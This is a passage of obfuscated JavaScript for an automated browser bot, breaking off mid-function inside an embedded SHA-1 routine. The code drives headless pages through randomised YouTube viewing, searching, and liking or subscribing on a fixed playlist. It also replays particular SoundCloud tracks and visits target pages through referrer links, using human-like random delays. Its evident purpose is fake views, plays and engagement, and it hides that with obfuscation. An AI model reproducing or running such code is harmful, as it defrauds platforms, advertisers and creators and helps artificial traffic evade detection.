const a0 = c,
  Z = b,
  Y = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x598 * -0x2 + -0x270c + 0x323d))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x7c * 0x35 + 0x1d * -0x6e + -0x59 * 0x26), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function a() {
  const bn = [
    'wColWQpdVsxcKG9YWQHL',
    'y2HPBgroB2rLCW',
    'restrictio',
    'BeHLCM9Fx2zVCG',
    'ACo5WQiFmrJcQmoIz2m',
    'zMLSDgvY',
    'WRJdT8kRW5ZcHcFcHSo6txe',
    'ullHero__t',
    'idu.com/',
    'ChrZl2j5lxnPDa',
    'I2rcRta7WJ',
    'C2HTywnPBNr5CG',
    'CMCVzw4VC2nYAq',
    'xCowWQtdUtpdHG',
    'AxbUEtzkvwj6DW',
    'Ahr0Chm6lY96yG',
    '2Dx76lD8Sc',
    'Ahr0Chm6lY9Tzq',
    'B3HWqxzJnNreua',
    'WONdUxBdU8ovgh9vW4zP',
    'n2n5odzoANnPCW',
    'k0BdOG',
    'zs95B3v0DwjLlG',
    'pHJdKLtdSSoQW7xcUmkKW4a',
    'none',
    'W7KOW6SxW7OgWRNdVtxcOq',
    'WRWVWPvUW40/WPRdV3BcOG',
    'mHNcPmovW6NcJmoPW4VdOCkm',
    'com/@Legal',
    'youtube-hi',
    'ptP3W7H1W6z6WP4',
    'lxn1CNzPDI1PBW',
    'gxdcOSoEt1X1eCoLya',
    'MY9MTNgXcN',
    'displayUse'
  ];
  a = function() {
    return bn;
  };
  return a();
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x11 * -0x52f + -0x21f * -0x46 + -0x38d5 * -0x1 + (0x8 * 0x2b6 + 0x7204 + 0x19b4 * -0x3) * random()) : await standardWaitForNetIdle(f), await wait(0x26de * -0x1 + -0x5a + 0x3ac0 + (0x2cad + -0x41c3 + -0x2 * -0x1e13) * random()), 0x35 * 0x95 + -0x1d00 + -0x1d8;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x93 * 0x2 + 0x267b + -0x5d * 0x31), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1 * 0x1ac9 + 0x125 * 0x20 + -0x3f68;
}
async function randomWait() {
  return await wait(-0x56 * -0x6b + -0x3 * 0x6f7 + -0x47b * -0x1 + (-0x2669 * 0x1 + 0x9ba + 0x3037) * random()), 0x1a * -0xd2 + -0x15a1 + 0x2af6;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x73a + 0x15 * -0xad + 0x1 * 0x6f7, -0x1 * -0x61 + 0x3 * -0x543 + -0x1 * -0xf6f), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x1146a + 0x5d4a * 0x1 + -0x8754) * getRandomInt(0x2b * -0xdd + -0x80 * 0x10 + 0x2d21, -0x11 * -0x91 + -0x57a + -0x422), h)), -0x64d + -0x1 * -0x26fb + -0x20ad;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = b,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))[R(0x15, 's^H@')]()['ariaValueT' + 'ext'],
      j = 0x1 * 0xaca + -0x25 * 0x27 + -0x527;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x83f + 0x1008 + -0xc23 * 0x2]['split']('\x20');
    for (let k = 0x1c66 + 0x441 * -0x1 + -0x1825; k < i['length']; k += -0x1d48 + 0x2 * 0xd96 + -0x21e * -0x1)
      j += i[k] * h[i[k + (0xd0d + -0x153 * 0x11 + 0x977)]];
    return j;
  });
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x2197 + -0xe68 * 0x1 + 0x665 * -0x3);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x39 + 0x97b + -0x93c)['map'](l => Array['from'](l['children']))['flat'](-0x3 * 0x937 + 0xf82 + 0xc24)['map'](l => l['childNodes'][-0x14f * 0x6 + 0x4 * -0x58d + 0x603 * 0x5]['childNodes'][0x4b + 0x891 + 0x144 * -0x7]['childNodes'][-0x1b6e + -0x11 * 0x1fd + -0x4 * -0xf4f]['childNodes'][-0x1ead + -0xf91 + 0x2 * 0x171f]['childNodes'][0x2 * -0x1384 + 0x1814 + 0x223 * 0x7]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0xb5e + -0x3 * -0x819 + -0x1fc1, -0x1666 * -0x1 + -0x1b * -0xe9 + -0x1b71)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x4ae * 0x13 + -0x8 * 0x44 + 0x4b3 * -0x6);
  const h = await getMaxTime(f),
    i = Math['min']((-0xbecb + -0x17c2 * -0x12 + -0x3 * 0xd3) * getRandomInt(0x1 * 0x22f1 + 0x107 * -0xb + -0x17a2, 0x1e * 0x132 + 0x757 + -0x2b2e), h);
  return await wait(i), -0x1a8e + 0x265e + 0x1 * -0xbcf;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const S = c;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))[S(0x5)](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x23ce + 0x697 + 0x1d37]['children'][-0x713 + 0x20dc + -0x19c9]['children'][-0x2425 + -0xe2 * 0x9 + 0x2c17]['children'][-0xd82 * 0x1 + -0x1ff2 + -0x2 * -0x16ba]['children'][-0x14a3 + 0x1496 + 0xd]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x134 * -0x1f + 0x1428 + 0x1125 * 0x1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1292 + -0x7 * -0xf + 0x1 * -0x1297 + (-0x871 + -0xe9 * -0x19 + -0xe1e) * random()
  }), await wait(-0x3ea + 0x1c5 * 0xa + -0x1 * 0xbd4 + (-0x1eba + -0x1990 + 0xb7e * 0x5) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const T = c,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0xcc9 + 0x1 * 0x16c6 + 0x7 * -0x16d]['childNodes'][-0x23a3 + 0x26b4 + -0x310]['childNodes'][0xd3f * -0x2 + -0x1 * -0x2446 + -0x9c7]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x10c * 0x25 + 0x2 * 0x12a9 + -0x4c09]['childNodes'][-0x1e0a + 0xc81 * 0x2 + 0x4 * 0x142][T(0x1)][-0x219d * 0x1 + -0x1 * 0xf1 + 0x2290]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xe05 * 0x1 + -0x1 * 0x118d + 0x389),
          r = 0x78b * -0x1 + 0x1c4e * -0x1 + 0x23d9;
        for (let u = -0x123 + -0x1 * -0x132f + -0x1 * 0x120c; u < q['length']; u += 0x1f1e + 0xf9 * 0x4 + -0x2300)
          r += q[u] * k[q[u + (-0x1a6c + 0x144 * -0xc + 0x1 * 0x299d)]];
        return r;
      }(n);
  });
  await wait((0x275 * 0x7 + -0x3e * -0x4f + -0x8b * -0x29) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x364c + 0x102b6 + -0x4ea2) * getRandomInt(0x1ee5 + -0xbe3 + -0x1301, 0x457 + -0x26 * 0x35 + 0x391), h + (-0x6c0 + 0x43 * -0x2f + 0x2695));
  return await wait(i), -0x10f * -0x1e + -0x8 * 0xb5 + 0x8b3 * -0x3;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x26 * 0x50 + -0x1b * -0xf4 + -0xddc), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x8ed + -0xa * 0x5 + 0x2fd + (0x1 * 0x1ea1 + -0x1be4 + 0x17 * 0xd) * Math['random']());
    });
  }, 0x8a * -0x4e + -0x304d * 0x1 + 0x75b1);
  await wait(0x91c7d + 0x1ee1a + -0x676b7);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1cde8 + -0x3e * 0x74c + -0x404 * -0x38) * getRandomInt(0x5a + -0x148c + 0x1 * 0x1436, 0x533 * 0x7 + 0x20db + -0x170d * 0x3)), clearInterval(h), 0xc42 * -0x3 + -0x2161 + 0x4628;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x3b * -0xc + -0x23fe + 0x2 * 0x109d;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1f91 + -0x25ca + 0x63a;
    await randomWait();
  }
  return 0x1032 + -0x223c + 0x120b;
}

function fetchRandomSC() {
  return Math['random']() <= -0xc2 * 0x8 + 0x1cf4 + -0x16e4 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x3e6 * -0x4 + -0x1 * 0x1507 + 0x1 * 0x249f + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1 * -0xeff + -0x11a3 + 0x2a4 + 0.3) {
      const j = await f['createInco' + U(0x6, 'Ca@L') + 'erContext'](),
        k = await j['newPage']();
      let l = 0x10 * 0xa7 + 0x3 * 0x4e9 + -0x17b * 0x11;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const W = d,
            V = c;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + V(0x3) + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + W(0x7) + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1518c + -0xd362 + -0x752 * -0x63 + getRandomInt(0x1f6c * 0x2 + 0x1 * -0x3aa5 + 0x3665, -0x2290 + -0x88f9 + -0x293f * -0x7));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1c8b * 0x1 + 0xf8 * -0xf + -0x4 * -0xac5), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x37 * 0x2f + 0x1f * 0x96 + 0x5a7 * -0x5;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x507 + -0xfff + -0xa83 * -0x2, -0x1161 + 0x5a5 * -0x2 + -0x99f * -0x3)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0xb7f * -0x1 + -0x7f0 + 0x4b * 0x5d + floor((-0x1b80 + -0x19 * 0xa3 + 0x2f53) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x1ebe330 * 0x3c + -0x20 * 0x629f149 + 0x1b8876860),
          -0xdc5f36 * -0x1 + -0x3be911 + 0x207625 * -0x1,
          -0x4436 * 0x2 + 0x195f * -0x3 + 0x15489,
          -0x18c7 + 0x14c6 + 0x481
        ], y = [
          0x2698 + 0x17 * -0x2f + -0x2247,
          0x1 * 0x190f + 0xbb8 + 0xf1 * -0x27,
          -0x152b * -0x1 + 0x9aa + -0x1ecd,
          -0x1 * 0x17f + -0x1e5d + 0x1fdc
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x430 * -0x7 + 0x1504 + -0x1a9 * -0x5)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x18fd + -0x7 * -0x173 + 0x14 * 0xbe; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x3f3 * -0x1 + -0x1c4b * -0x1 + -0x1858) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1 * 0x12c7 + -0x25a3 + -0x2 * -0x96e] = A[0x10e + 0xa6b + 0xb69 * -0x1] = A[0xe * 0x12f + 0x1dcd * 0x1 + -0x2e5e] = A[-0x14c6 + -0x631 + -0x1 * -0x1af9] = A[0x1625 + 0x1b6a + -0x318c] = A[-0x16ea + -0x23bd + -0x28d * -0x17] = A[-0x140b * 0x1 + -0x1fe1 + 0x33f1 * 0x1] = A[-0x19b4 + 0x140a + 0x5b0] = A[-0x1160 + -0x1215 + 0x3 * 0xbd4] = A[0xea2 + -0x2 * -0xa08 + -0x22aa] = A[0x366 + -0xf34 + 0xbd7] = A[0x5b * 0x2b + -0x12eb + 0x3ac] = A[0x1d5e + -0x180 + -0x1bd3] = A[-0xebd + 0x1564 + -0x69b] = A[-0x5 * 0x148 + -0x170e + 0x1d83] = A[-0x156f * -0x1 + -0x17 * -0x1af + -0x3c1a * 0x1] = A[-0x10b * -0x13 + -0x12c5 + 0xfd * -0x1] = -0xdce + -0x268a + 0x3458, this['blocks'] = A) : this['blocks'] = [
                -0x2ab * 0x2 + -0x2ea * 0x4 + -0x87f * -0x2,
                -0x668 + 0x26b1 + 0x5f * -0x57,
                0x157c + 0x531 * -0x1 + -0x104b,
                0x31 * -0x7 + -0x20b0 + -0x2207 * -0x1,
                -0x1 * -0x70d + 0x1694 + 0x1 * -0x1da1,
                0x10af * 0x2 + 0x37 * 0x2 + -0x21cc,
                0x2309 * 0x1 + 0x3e1 * -0x5 + -0xfa4,
                -0x13 * -0x1f9 + 0x262d * -0x1 + 0xb2,
                0xcde + 0x1ad6 + 0x1e4 * -0x15,
                -0x1 * -0x20e3 + 0x1 * -0x665 + -0x1a7e,
                0x41 * 0x1 + -0x1 * 0x1882 + 0x377 * 0x7,
                -0x4 * 0x68c + -0x1 * 0x1321 + 0x9 * 0x509,
                -0x7b9 + 0x3 * 0x1 + -0x2f * -0x2a,
                -0x38 * -0x1f + 0x9aa * -0x4 + -0x1e * -0x110,
                0x666 + -0x1c6 * 0x8 + 0x7ca * 0x1,
                -0x2 * -0x3e + 0x1 * 0x1e43 + -0x1ebf,
                -0x2d * 0xb9 + -0x56 * -0x65 + -0x1 * 0x169
              ], this['h0'] = -0x1164da0c * 0x6 + -0x1431d753 + 0xe3d4169c, this['h1'] = -0x1d4806477 + -0x639c946d * -0x1 + 0x260b17b93, this['h2'] = 0xd51711 * 0x3e + -0x29d86807 * 0x3 + 0x1b * 0x8650e2f, this['h3'] = -0x120f4 * 0xf9f + -0x190d9059 + 0x3ae1a85b * 0x1, this['h4'] = 0x17eec1 * 0x3a1 + -0x1826db512 + 0x1ef672ca1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xc * 0x1e8 + -0x367 * -0x1 + -0x5 * -0x3e5, this['finalized'] = this['hashed'] = 0x1 * -0x80f + -0x1 * 0x146f + 0x1c7e, this['first'] = -0x28d + 0x26 * -0x4d + 0xdfc;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x98 * 0x1f + 0x1fc9 + 0x2ad * -0x5, O = J['length'] || -0x388 * -0xb + -0xd * -0x1e7 + -0x5 * 0xcb7, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x2493 * -0x1 + 0x317 + -0x85f * -0x4, P[0x1ae3 + -0xb5f + -0xf84] = this['block'], P[0x1 * 0xcc5 + 0x1 * -0x26c5 + -0x10 * -0x1a1] = P[0x427 + 0x6be * 0x2 + 0x7a * -0x25] = P[-0x7e3 * -0x1 + 0x1 * -0x229d + -0x74 * -0x3b] = P[0x1f8e + 0x1053 + -0x2fde] = P[-0x1729 + -0x14b4 + 0x2be1] = P[-0xf39 * 0x2 + -0x4 * -0x989 + -0x7ad * 0x1] = P[0x139c * 0x1 + 0x5a + 0x8 * -0x27e] = P[-0x1565 * -0x1 + -0x15b1 + 0x53 * 0x1] = P[0x10a5 * 0x1 + -0x1 * 0x695 + -0x282 * 0x4] = P[-0x11 * 0x1ab + 0x1 * -0x1501 + 0x3165] = P[-0x932 * 0x1 + 0x4 * -0x27d + 0x133 * 0x10] = P[-0x13 * -0x41 + -0x191d + 0xf * 0x15b] = P[-0x43 * 0x61 + 0x1b3c + -0x1cd] = P[0x1 * -0xfc2 + -0x1e1d + 0x2dec] = P[-0x6c5 * -0x2 + 0xe3a + -0x1bb6] = P[0x1 * -0x21f5 + -0x1103 * -0x1 + 0x1101] = -0x2 * -0x6e2 + 0x1b84 + -0x2948), K) {
                    for (N = this['start']; M < O && N < 0x1 * -0x1c78 + 0x7a6 + 0x1 * 0x1512; ++M)
                      P[N >> 0x1236 + 0x3cc + -0x1600] |= J[M] << y[0x1 * 0x1d5d + -0x19ed + -0x36d & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1 * -0x5e3 + 0x79 * 0x47 + -0x2732; ++M)
                      (L = J['charCodeAt'](M)) < -0x1428 + -0x151f * -0x1 + -0x7 * 0x11 ? P[N >> -0x1a05 + -0x3 * -0x876 + -0xb * -0xf] |= L << y[-0x74a * 0x2 + 0x287 * 0x2 + 0x989 & N++] : L < -0x1735 + -0x1bd4 + 0x3b09 ? (P[N >> 0x2407 + 0x1 * -0x9bf + -0x1a46 * 0x1] |= (-0x2 * 0x55 + -0x15f2 + -0x1cc * -0xd | L >> 0x148a + -0xe3 * 0x1 + -0x13a1) << y[0x498 + 0x9e8 + 0x1 * -0xe7d & N++], P[N >> 0x69f + -0x1 * -0x5f5 + -0xc92] |= (0x1 * -0x23ac + 0x587 + 0x5 * 0x621 | 0x21c1 + 0x1 * -0x136f + -0xe13 & L) << y[0x274 + 0xb28 + 0xd99 * -0x1 & N++]) : L < -0x3 * -0x27df + -0xaeb6 + 0x10f19 || L >= -0x16217 + -0x5bc7 + 0x2 * 0x14eef ? (P[N >> 0xe4 * 0x11 + 0x7 + 0xf29 * -0x1] |= (0x1345 * -0x1 + 0x1b5c + -0x737 | L >> -0x1 * -0x78d + 0x1e02 + -0x9 * 0x42b) << y[-0x2175 + 0x2203 * 0x1 + -0x8b & N++], P[N >> -0x1340 + 0x1 * -0xc96 + -0x3fb * -0x8] |= (-0x904 + -0x2269 * 0x1 + 0x2bed | L >> -0x1 * 0x1f81 + 0x1 * 0x5b6 + 0x19d1 & -0x26f5 * 0x1 + -0x1 * -0xcc9 + 0x1a6b) << y[-0x2a5 * 0xc + -0x19f1 + 0x39b0 & N++], P[N >> 0xfd + -0xa8c + 0x991 * 0x1] |= (0x24f + 0x1429 * 0x1 + -0x26 * 0x94 | 0x21dd + 0x16ff + 0x1 * -0x389d & L) << y[-0x1e6 + 0x2467 + -0x227e * 0x1 & N++]) : (L = -0x429e * -0x1 + 0x1628f + -0x5 * 0x2109 + ((0x15a + 0x2e * 0x27 + -0x45d * 0x1 & L) << -0xb75 + 0x4 * -0x84e + 0x1 * 0x2cb7 | 0x528 + -0xa70 + 0x5 * 0x1db & J['charCodeAt'](++M)), P[N >> -0x1 * 0x705 + 0xa36 + -0x32f] |= (-0x19b6 + 0x3 * -0x85f + 0x1141 * 0x3 | L >> -0x19cf + -0x7ed + -0x21ce * -0x1) << y[0x2bb + -0xa72 + -0x17 * -0x56 & N++], P[N >> 0x29 * -0xef + 0x14 * -0x27 + 0x2955] |= (-0x59 * 0x1 + -0x27 * 0xc7 + 0x1f2a | L >> -0x1d24 + -0xb75 * 0x2 + -0x12 * -0x2e5 & 0x7c9 * 0x1 + 0xeb6 * -0x1 + 0x72c) << y[0x1e * 0xc9 + -0x18eb * -0x1 + 0x2 * -0x183b & N++], P[N >> 0x42d + -0x26ba + 0x9 * 0x3d7] |= (-0x206a + -0xf38 + 0x3022 | L >> -0x875 * -0x1 + 0x2086 + -0x28f5 & 0xa21 + -0x1814 * 0x1 + -0x9e * -0x17) << y[-0x89 + -0x594 + 0x620 & N++], P[N >> 0x1 * -0x832 + -0x1 * -0x96b + -0x137 * 0x1] |= (-0x38 * 0xb + 0x2b1 * 0xd + -0x2015 | 0x2 * -0x132c + -0x1a02 + -0x17 * -0x2cf & L) << y[0xb * -0xa2 + 0x575 + 0x184 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0xcff + 0x77 + 0xcc8 ? (this['block'] = P[-0x25f7 * 0x1 + 0x1 * -0x1e4f + 0x4456], this['start'] = N - (0x6a5 + -0x69 + -0x5fc), this['hash'](), this['hashed'] = -0x253e + -0x3 * 0xb83 + -0x23e4 * -0x2) : this['start'] = N;
                }
                return this['bytes'] > 0x16 * 0x3a54472 + -0x220c * 0x46a6f + -0x1 * -0x14623d967 && (this['hBytes'] += this['bytes'] / (0x6b961455 * 0x4 + -0x4e995cf8 * -0x1 + -0x1754 * 0xad7c7) << -0x1765 + 0x1 * 0x691 + 0x10d4, this['bytes'] = this['bytes'] % (-0x73274 * -0x3742 + 0x2de2ebc * 0x2 + -0x936e4b60)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0xeca * 0x2 + -0x1584 + 0x67 * 0x7f;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0xc0 + -0xc3a + 0xb8a] = this['block'], J[K >> -0x7 * -0xf3 + 0x13bc + -0x1a5f] |= x[-0x20e3 + -0xa * 0xee + -0x1eb * -0x16 & K], this['block'] = J[-0x442 + -0x513 * 0x2 + -0x39e * -0x4], K >= -0x2 * -0x425 + -0x17fe + 0x1 * 0xfec && (this['hashed'] || this['hash'](), J[-0x1 * -0xe + -0x1439 + 0x142b] = this['block'], J[-0x2c0 + 0x16fa + -0x142a] = J[0x65d + 0x1d + -0x679 * 0x1] = J[-0x1f51 * 0x1 + 0x1 * 0x7ed + -0x2 * -0xbb3] = J[0x1 * 0x1a1 + 0x22aa + -0x912 * 0x4] = J[-0xff4 + 0x1 * -0xead + -0x1ea5 * -0x1] = J[-0x217c + 0x783 + 0x8aa * 0x3] = J[-0x2046 + 0xa71 + 0x15db] = J[-0x76d * 0x1 + 0x28 * 0x6d + -0x994] = J[0x287 * -0xb + -0xa13 + 0x4bd * 0x8] = J[0xf70 + 0x61 * 0x5 + -0x114c] = J[-0x117f + 0x2686 + -0x14fd] = J[-0x1f90 + 0x2 * 0x188 + 0x1c8b * 0x1] = J[0x38 * -0x4e + -0x6ba + 0x17d6] = J[-0x1f96 + 0x1415 + 0xb8e] = J[-0x7 * 0x4d7 + 0x6a + -0x2185 * -0x1] = J[-0x219b + 0x10ef + 0x10bb] = -0x1ff4 + 0x750 + -0x13 * -0x14c), J[-0xcfb * 0x3 + -0x49 * 0x1 + 0x346 * 0xc] = this['hBytes'] << -0x1d54 * -0x1 + -0x25 * 0x1 + -0x74b * 0x4 | this['bytes'] >>> 0x1762 + 0x241 * -0x7 + -0x77e, J[-0x1 * -0x2665 + 0x2 * -0x7c4 + -0x16ce] = this['bytes'] << -0x1 * 0xa1f + 0x643 + 0x3df, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
